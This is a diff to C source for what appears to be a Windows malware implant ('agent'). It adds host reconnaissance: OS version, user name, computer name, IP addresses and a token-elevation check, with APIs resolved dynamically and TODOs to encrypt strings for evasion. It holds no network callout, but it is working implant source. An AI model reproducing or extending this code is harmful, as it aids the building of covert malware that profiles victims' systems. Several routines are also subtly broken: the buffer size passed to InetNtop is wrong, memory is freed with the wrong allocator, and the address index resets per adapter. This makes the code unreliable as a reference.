@@ -1,18 +1,34 @@
 #include "enum.h"
+#include "token.h"
 
 //TODO finish enumeration
 
 BOOL Enumerate(pAgent agent)
 {
 	//TODO: this may be an issue since we're not allocating memory manually & copying it into buffer.
-	agent->OperatingSystem = GetOperatingSystemFunc(agent);
-	agent->UserName = GetUser(agent);
-	agent->ComputerName = GetCompName(agent);
+	if(GetOperatingSystemFunc(agent) != 0) {
+		printf("[error] attempting to get operating system information\n");
+		return FALSE;
+	}
+	if (GetUser(agent) != 0) {
+		printf("[error] attempting to get user information\n");
+		return FALSE;
+	}
+	if ( GetCompName(agent) != 0) {
+		printf("[error] attempting to get computer name\n");
+		return FALSE;
+	}
+	if( GetIPAddress(agent) != 0) {
+		printf("[error] attempting to get ip address\n");
+		return FALSE;
+	}
+
+	agent->Context->Elevated = IsElevated(agent);
 	return TRUE;
 }
 
 //TODO replacee all strings with encoded / encrypted content.
-LPSTR GetOperatingSystemFunc(pAgent agent) {
+INT GetOperatingSystemFunc(pAgent agent) {
 	LPCSTR OS = NULL;
 	RTL_OSVERSIONINFOEXW lpVersionInformation = { 0 };
 	lpVersionInformation.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOEXW);
@@ -20,140 +36,37 @@ LPSTR GetOperatingSystemFunc(pAgent agent) {
 	status = agent->pRtlGetVersion(&lpVersionInformation);
 	if (status != NTSUCCESS) {
 		printf("[error] attempting to retrieve the operating system versions. [%08X]", status);
-		return OS;
+		return -1;
 	}
-
-	//determine which OS we're using
-	switch (lpVersionInformation.dwMajorVersion) {
-	//incase we're windows 10 OS.
-	case 10:
-
-		switch (lpVersionInformation.wProductType)
-		{
-		case VER_NT_WORKSTATION:
-			OS = "Windows 10";
-			break;
-		default :
-			OS = "Windows Server 2016";
-			break;
-		}
-		break;
-
-	//incase we're windwos 8 OS. / 7 / vista
-	case 6:
-		switch (lpVersionInformation.dwMinorVersion)
-		{
-			//windows 8.1 / serverr 2012 r2
-		case 3:
-			switch (lpVersionInformation.wProductType)
-			{
-			case VER_NT_WORKSTATION:
-				OS = "Windows 8.1";
-				break;
-			default: 
-				OS = "Windows Server 2012 R2";
-				break;
-			}
-			break;
-
-			// windows 8 / server 2012
-		case 2:
-			switch (lpVersionInformation.wProductType)
-			{
-			case VER_NT_WORKSTATION:
-				OS = "Windows 8";
-				break;
-			default:
-				OS = "Windows Server 2012";
-				break;
-			}
-			break;
-
-			//windows 7 / 2008 r2
-		case 1:
-			switch (lpVersionInformation.wProductType)
-			{
-			case VER_NT_WORKSTATION:
-				OS = "Windows 7";
-				break;
-			default:
-				OS = "Windows Server 2008 R2";
-				break;
-			}
-			break;
-
-			// windows Vista / 2008
-		default:
-			switch (lpVersionInformation.wProductType)
-			{
-			case VER_NT_WORKSTATION:
-				OS = "Windows Vista";
-				break;
-			default:
-				OS = "Windows Server 2008";
-				break;
-			}
-			break;
-
-		}// case 6 dwMinorVersion
-
-		//Windows Server 2003 / Home Server / 2003 r2 / XP / XP Pro / 2000
-	case 5:
-		switch (lpVersionInformation.dwMinorVersion)
-		{
-		case 2:
-			if (agent->pGetSystemMetrics(SM_SERVERR2) != 0)
-			{
-				OS = "Windows Server 2003 R2";
-				break;
-			}
-			else if (lpVersionInformation.wSuiteMask & VER_SUITE_WH_SERVER)
-			{
-				OS = "Windows Home Server";
-				break;
-			}
-			else if (agent->pGetSystemMetrics(SM_SERVERR2) == 0)
-			{
-				OS = "Windows Server 2003";
-				break;
-			}
-			else
-			{
-				OS = "WIndows XP Professional x64 Edition";
-				break;
-			}
-			break;
-		case 1:
-			OS = "Windows XP";
-			break;
-		case 0:
-			OS = "Windows 2000";
-			break;
-		}//case 5 dwMinorVersion
-
-	default:
-		OS = "Unknown";
-		break;
-	}
+	agent->Context->dwMajorVersion = lpVersionInformation.dwMajorVersion;
+	agent->Context->dwMinorVersion = lpVersionInformation.dwMinorVersion;
+	agent->Context->wProductType = lpVersionInformation.wProductType;
+	agent->Context->dwBuildNumber = lpVersionInformation.dwBuildNumber;
+	agent->Context->dwPlatformId = lpVersionInformation.dwPlatformId;
+	agent->Context->wServicePackMajor = lpVersionInformation.wServicePackMajor;
+	agent->Context->wServicePackMinor = lpVersionInformation.wServicePackMinor;
+	agent->Context->wSuiteMask = lpVersionInformation.wSuiteMask;
 	
-	return OS;
+	return 0;
 }
 
 
-LPSTR GetUser(pAgent agent) {
+INT GetUser(pAgent agent) {
 	PVOID            Data = NULL;
 	DWORD            dwLength = UNLEN + 1;
 
 	if (Data = LocalAlloc(LPTR, dwLength)) {
 		agent->pGetUserNameA(Data, &dwLength);
+		agent->Context->UserName = Data;
+		return 0;
 	}
+	return -1;
 	
-	return Data;
 }
 
 
 //TODO replace this with a function that obtians comptuer name from registry or from env variables.
-LPSTR GetCompName(pAgent agent) {
+INT GetCompName(pAgent agent) {
 	PVOID            Data = NULL;
 	SIZE_T           Length = 0;
 	DWORD            dwLength = 0;
@@ -164,12 +77,98 @@ LPSTR GetCompName(pAgent agent) {
 		{
 			if (agent->pGetComputerNameExA(ComputerNameNetBIOS, Data, &dwLength))
 			{
-				return Data; // this may return nothing. if having issues pass a buffer to copy the memory to.
-				//returning this way actually will give us two locations where our computer name will exist. In the heap & in the buffer location in our agent.
-				//freeing this section after use will negate this however, we need to pass our agent into the function for that. Cpy the mem then deallocate.
+				agent->Context->ComputerName = Data;
+				return 0;
+			}
+			else {
+				LocalFree(Data);
+				return -1;
 			}
 		}
 	}
 
 	
+}
+//TODO FIX THIS SHIT
+INT GetIPAddress(pAgent agent) {
+	WSADATA wsaData;
+	DWORD dwSize = 0;
+	DWORD dwRetVal = 0;
+	ULONG flags = GAA_FLAG_INCLUDE_PREFIX;
+	PIP_ADAPTER_ADDRESSES pAddresses = NULL, pCurrAddresses = NULL;
+	PIP_ADAPTER_UNICAST_ADDRESS pUnicast = NULL;
+
+	// Initialize Winsock
+	if (agent->pWSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+		printf("WSAStartup failed.\n");
+		return 1;
+	}
+
+	// Call GetAdaptersAddresses to determine the size needed
+	dwRetVal = agent->pGetAdaptersAddresses(AF_UNSPEC, flags, NULL, pAddresses, &dwSize);
+	if (dwRetVal == ERROR_BUFFER_OVERFLOW) {
+		pAddresses = (IP_ADAPTER_ADDRESSES*)LocalAlloc(LPTR, dwSize);
+		if (pAddresses == NULL) {
+			printf("Memory allocation failed for IP_ADAPTER_ADDRESSES struct.\n");
+			agent->pWSACleanup();
+			return 1;
+		}
+	}
+
+	// Make the actual call to GetAdaptersAddresses
+	dwRetVal = agent->pGetAdaptersAddresses(AF_UNSPEC, flags, NULL, pAddresses, &dwSize);
+	if (dwRetVal == NO_ERROR) {
+		
+		// Iterate through all of the adapters
+		for (pCurrAddresses = pAddresses; pCurrAddresses != NULL; pCurrAddresses = pCurrAddresses->Next) {
+			int count = 0;
+			printf("\nAdapter name: %s\n", pCurrAddresses->AdapterName);
+
+			// Iterate through all of the unicast IP addresses
+			for (pUnicast = pCurrAddresses->FirstUnicastAddress; pUnicast != NULL; pUnicast = pUnicast->Next) {
+				LPSTR ip = (LPSTR)LocalAlloc(LPTR, INET6_ADDRSTRLEN);
+				void* addr;
+
+				if (pUnicast->Address.lpSockaddr->sa_family == AF_INET) {
+					addr = &((struct sockaddr_in*)pUnicast->Address.lpSockaddr)->sin_addr;
+				}
+				else {
+					addr = &((struct sockaddr_in6*)pUnicast->Address.lpSockaddr)->sin6_addr;
+				}
+
+				agent->pInetNtop(pUnicast->Address.lpSockaddr->sa_family, addr, ip, sizeof(ip));
+				agent->Context->IPAddress[count] = ip;
+				count++;
+			}
+		}
+	}
+	else {
+		printf("Call to GetAdaptersAddresses failed.\n");
+	}
+
+	if (pAddresses) {
+		free(pAddresses);
+	}
+
+	agent->pWSACleanup();
+	return 0;
+}
+
+BOOL IsElevated(
+	pAgent agent
+) {
+	HANDLE Token = { 0 };
+	BOOL   Admin = FALSE;
+
+	/* query if current process token is elevated or not */
+	if ((Token = TokenCurrentHandle(agent))) {
+		Admin = TokenElevated(Token, agent);
+	}
+
+	/* close token handle */
+	if (Token) {
+		agent->pNtClose(Token); //TODO redifine NtClose through dynamic resolution.
+	}
+
+	return Admin;
 }
